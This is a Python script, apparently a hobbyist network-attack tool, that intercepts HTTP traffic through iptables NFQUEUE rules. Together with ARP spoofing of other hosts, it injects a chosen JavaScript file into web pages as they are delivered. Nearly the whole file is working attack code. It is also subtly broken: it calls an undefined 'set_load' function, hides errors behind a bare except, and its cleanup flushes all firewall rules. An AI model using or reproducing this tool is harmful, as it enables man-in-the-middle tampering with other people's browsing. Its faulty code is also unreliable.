#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              10 December 2020 
* Filename:             code_injector.py
* Example Run (Linux):  python3 code_injector.py -s ./script.js -t local
"""

import argparse
import subprocess
import netfilterqueue
import re
import scapy.all as scapy

"""
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("[+] If the script to be injected is in the present working directory and the target system is local host, then run the script as:")
    print("\tpython3 " + __file__ + " -s ./script.js -t local")
    print("[+] If the script to be injected is in the present working directory and the target system is another host in the same network, then run the script as:")
    print("\tpython3 " + __file__ + " -s ./script.js -t other")
    print("Also make sure the ARP spoofing script is running in the case of other systems.\n")    

""" 
* Function Name:  get_code_injector_args()
* Input:          None
* Output:         args.script (string): Path to the script to be injected.
*                 args.target (string): Specifies whether your target is the local system or another system in the network. 
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   script_loc, target = get_code_injector_args()
"""
def get_code_injector_args():
    parser = argparse.ArgumentParser()                             
    parser.add_argument("-s", "--script", type=str, help="File type of the file to be replaced (required)")
    parser.add_argument("-t", "--target", type=str, help="Either 'local' or 'other'. Specifies whether we are trying to spoof the DNS for the local system or another system in the network. (required)")
    args = parser.parse_args()

    if((args.script == None) and (args.target == None)):
        print("\nError: Script and target missing!! Pass the location to the script and target (local/other) as an argument to the script.")
        print_sample_usage_msg()        

    elif(args.script == None):
        print("\nError: Location of the script to be injected missing!! Pass the location of the script to be injected as an argument to this script.")
        print_sample_usage_msg()

    elif(args.target == None):
        print("\nError: Target missing!! Pass the target (local/other) as an argument to the script.")
        print_sample_usage_msg()

    return args.script, args.target

""" 
* Function Name:  create_packet_queue()
* Input:          target (string): Specifies whether the target is our local system or another system in the network. 
* Output:         1 if the packet queue is created successfully or else 0
* Logic:          Creating a packet queue in the system using subprocessor calls so that the packets will move out only after they 
*                 are modified by our script.
* Example Call:   created = create_packet_queue("local")
"""
def create_packet_queue(target):
    if(target == "local"):
        subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        return 1
    
    elif(target == "other"):
        subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        return 1

    return 0

""" 
* Function Name:  flush_packet_queue()
* Input:          None
* Output:         None
* Logic:          The function is used to remove all the created packet queues.
* Example Call:   flush_packet_queue()
"""
def flush_packet_queue():
    subprocess.call("sudo iptables --flush", shell=True)

""" 
* Function Name:  get_script()
* Input:          script_loc (string): Path to the script to be injected.
* Output:         script (string): The contents inside the script file.
* Logic:          The function returns the contents of the script file if it exists in the specified location.
* Example Call:   script = get_script("./script.js")
"""
def get_script(script_loc):
    script = open(script_loc, "r")
    return script.read()

""" 
* Function Name:  process_packet()
* Input:          packet (string): The packet in the packet queue.
* Output:         None
* Logic:          A callback function used to process each packet in the queue. It modifies the location of the file to be downloaded in the packet
*                 and sends the modified packet to the target.
* Example Call:   process_packet(packet)
"""
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if(scapy_packet.haslayer(scapy.Raw)):
        if(scapy_packet.haslayer(scapy.TCP)):
            try:
                load = scapy_packet[scapy.Raw].load.decode('utf-8')

                if(scapy_packet[scapy.TCP].dport == 80):
                    print("Received HTTP Request...")
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                elif(scapy_packet[scapy.TCP].sport == 80):
                    print("Received HTTP Response...")
                    
                    if "text/css" not in load and "application/x-javascript" not in load and "function" not in load and "</" in load:
                        print(load)

                    load = load.replace("</body>", script + "</body>")
                    content_length = re.search("(?:Content-Length:\s)(\d*)", load)

                    if((content_length != None) and ("text/html" in load)):
                        print("Injecting the script...")
                        content_length = content_length.group(1)
                        new_content_length = int(content_length) + len(script)
                        load = load.replace("Content-Length: " + content_length, "Content-Length: " + str(new_content_length))
                        print("SUCCESSFULLY injected code and sent to target.")

                if(load != scapy_packet[scapy.Raw].load.decode('utf-8')):
                    del(scapy_packet[scapy.IP].len)
                    del(scapy_packet[scapy.IP].chksum)
                    del(scapy_packet[scapy.TCP].chksum)

                    packet.set_payload(str(set_load(scapy_packet, load)))

            except:
                pass
        

    packet.accept()


if __name__ == "__main__":
    script_loc, target = get_code_injector_args()
    
    if((script_loc != None) and (target != None)):
        try:
            created = create_packet_queue(target)
            
            if(created):
                script = get_script(script_loc)
                
                print("\nStarting Code Injector...\n")

                queue = netfilterqueue.NetfilterQueue()
                queue.bind(0, process_packet)
                queue.run()

            else:
                print("\nERROR: Please specify a valid target. The target should be either 'local' or 'other'.")
                print_sample_usage_msg()

        except KeyboardInterrupt: 
            print("\n\nStopping Code Injector...")

        finally:
            if(created):
                print("Flushing created IP queues...")
                flush_packet_queue()
                print("\nDONE.\n")